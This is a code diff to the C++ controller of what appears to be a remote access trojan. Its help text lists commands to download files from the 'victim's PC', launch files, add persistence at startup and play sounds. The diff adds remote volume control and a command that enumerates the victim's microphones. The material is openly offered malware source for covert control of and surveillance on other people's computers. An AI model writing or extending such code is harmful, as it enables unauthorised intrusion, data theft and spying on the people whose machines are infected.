@@ -45,6 +45,7 @@ void help_menu()
     printf("download <file> - download file from victim's PC\n\n");
     printf("execute <file/url> - lauch file or open url\n\n");
     printf("--------SOUNDS--------\n\n");
+    printf("volume <0/65535> - set volume on victim's PC\n\n");
     printf("beep <sec> - play weird sound for X sec on victim's PC\n\n");
     printf("play <file> - play music from file\n\n");
     printf("--------INFORMATION--------\n\n");
@@ -331,9 +332,35 @@ int main(int argc, char* argv[])
             else if (command == "add-startup") {
                 SendAndReceive(client, command);
             }
+            else if (command.substr(0, 6) == "volume") {
+                if (command.length() > 6) {
+                    try {
+                        std::string volumeStr = command.substr(7);
+                        int volume = std::stoi(volumeStr);
+                        if (volume >= 0 && volume <= 65535)
+                            SendAndReceive(client, command);
+                        else { 
+                            ColoredText(F_LIGHTRED); 
+                            printf("[!] Usage: volume <0/65535>\n");
+                        }
+                    } catch (const std::invalid_argument&) {
+                        ColoredText(F_LIGHTRED);
+                        printf("[!] Usage: volume <0/65535>\n");
+                    }
+                } else {
+                    ColoredText(F_LIGHTRED);
+                    printf("[!] Usage: volume <0/65535>\n");
+                }
+            }
+            else if (command == "microphones" || command == "mics") {
+                SendAndReceive(client, command);
+            }
 
             else if (command == "help") {
                 help_menu();
+            }
+            else if (command == "clear" || command == "cls") {
+                system("cls");
             }
             else if (command == "exit" || command == "quit" || command == "bye") {
                 SendAndReceive(client, command.c_str());
